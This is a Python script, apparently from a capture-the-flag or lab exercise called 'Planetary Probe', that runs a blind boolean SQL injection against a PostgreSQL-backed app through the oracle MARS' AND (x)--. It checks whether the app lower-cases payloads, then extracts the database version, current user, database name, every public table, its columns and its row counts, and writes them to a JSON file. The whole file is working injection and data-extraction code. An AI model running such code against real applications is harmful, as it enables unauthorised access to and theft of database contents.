#!/usr/bin/env python
"""Planetary Probe: the backend is PostgreSQL, so read the schema out of information_schema.

Two things have to be pinned down before any blind extraction is trustworthy:
  * does the app rewrite the payload (lower-casing would silently corrupt every uppercase
    literal I compare against, turning real matches into false negatives), and
  * is the anchor row (`MARS`) always present, since the whole oracle is `MARS' AND (x)--`.
Literals are therefore built from chr()/ascii() comparisons only when case matters.
"""
import json
import sys

from recon import CALL, cond, count, text

CTRL = [
    ("1=1", True), ("1=2", False),
    ("'A'='A'", None), ("'A'='a'", None),
    ("'a'='a'", None), ("chr(65)=chr(65)", None),
]


def normalisation():
    print("[*] payload normalisation controls")
    res = {}
    for expr, want in CTRL:
        got = cond(expr)
        res[expr] = got
        print("    %-18s -> %-5s %s" % (expr, got, "" if want is None else "(want %s)" % want))
    lower = res["'A'='a'"] and not res["'A'='A'"]
    print("[*] app lower-cases the payload:", lower)
    return lower


def schema(lowered):
    print("[*] version:", text("(SELECT version())", maxlen=120, label="version"))
    print("[*] current user:", text("(SELECT current_user)", label="current_user"))
    cond("1=1")
    db = text("(SELECT current_database())", label="db")
    print("[*] database:", db)
    where = "table_schema='public'"
    n = count("(SELECT COUNT(*) FROM information_schema.tables WHERE %s)" % where, "public tables")
    tables = []
    for i in range(n):
        t = text("(SELECT table_name FROM information_schema.tables WHERE %s "
                 "ORDER BY table_name LIMIT 1 OFFSET %d)" % (where, i), label="table%d" % i)
        if t:
            tables.append(t)
    print("[+] tables:", tables)
    info = {}
    for t in tables:
        k = count("(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='public' "
                  "AND table_name='%s')" % t, "cols in " + t)
        cols = [text("(SELECT column_name FROM information_schema.columns WHERE "
                     "table_schema='public' AND table_name='%s' ORDER BY ordinal_position "
                     "LIMIT 1 OFFSET %d)" % (t, j), label="%s.col%d" % (t, j)) for j in range(k)]
        rows = count("(SELECT COUNT(*) FROM \"%s\")" % t, "rows in " + t)
        info[t] = {"columns": cols, "rows": rows}
        print("[+] %-18s rows=%-4d cols=%s" % (t, rows, cols))
    json.dump(info, open("analysis/schema.json", "w"), indent=1)
    return info


if __name__ == "__main__":
    lowered = normalisation()
    info = schema(lowered)
    print("[*] %d probes used" % CALL[0])
    print(json.dumps(info, indent=1))
